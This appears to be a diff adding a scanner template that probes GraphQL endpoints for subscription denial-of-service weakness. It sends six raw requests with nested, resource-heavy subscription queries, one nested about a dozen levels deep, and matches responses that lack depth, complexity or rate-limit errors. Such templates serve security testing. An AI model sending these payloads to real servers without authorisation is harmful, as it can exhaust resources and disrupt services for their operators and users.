@@ -1,0 +1,114 @@
+id: medium-api-graphql-subscription-dos-attack
+
+info:
+  name: GraphQL Subscription DoS Attack
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects GraphQL subscription DoS vulnerabilities where attackers can create
+    multiple expensive subscriptions, nested subscription queries, or resource-intensive
+    real-time connections to overwhelm server resources and cause denial of service.
+  reference:
+    - https://graphql.org/learn/subscriptions/
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cvss-score: 7.5
+    cwe-id: CWE-400
+  tags: graphql,subscription,dos,denial-of-service,api,medium
+
+http:
+  - raw:
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"subscription { messageAdded { id content user { id name email profile { avatar bio location } } timestamp } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"subscription { userStatusChanged { id status lastSeen user { id name email friends { id name email profile { avatar bio } } } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"subscription { notificationReceived { id type message user { id name email notifications { id type message timestamp } } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"subscription { orderUpdated { id status items { id name price quantity product { id name description category { id name products { id name price } } } } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"subscription { liveDataFeed { timestamp data { users { id name posts { id title content comments { id content author { id name } } } } } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"subscription DeepNested { eventTriggered { id type payload { user { id profile { friends { posts { comments { replies { author { profile { friends { posts { id } } } } } } } } } } } }"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: regex
+        part: body
+        regex:
+          - '"data":\s*\{'
+          - '"messageAdded":\s*\{'
+          - '"userStatusChanged":\s*\{'
+          - '"notificationReceived":\s*\{'
+          - '"orderUpdated":\s*\{'
+          - '"liveDataFeed":\s*\{'
+          - '"eventTriggered":\s*\{'
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"errors":\s*\['
+          - '"error":\s*"subscription.*not.*allowed"'
+          - '"error":\s*"query.*too.*complex"'
+          - '"error":\s*"depth.*limit.*exceeded"'
+          - 'subscription.*disabled'
+          - 'rate.*limit.*exceeded'
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "X-GraphQL-Subscription-Limit: exceeded"
+          - "X-Query-Complexity-Limit: exceeded"
+
+      - type: regex
+        part: response
+        negative: true
+        regex:
+          - 'HTTP/1\.[01] 429'
+          - 'HTTP/1\.[01] 503'
+
+    stop-at-first-match: true
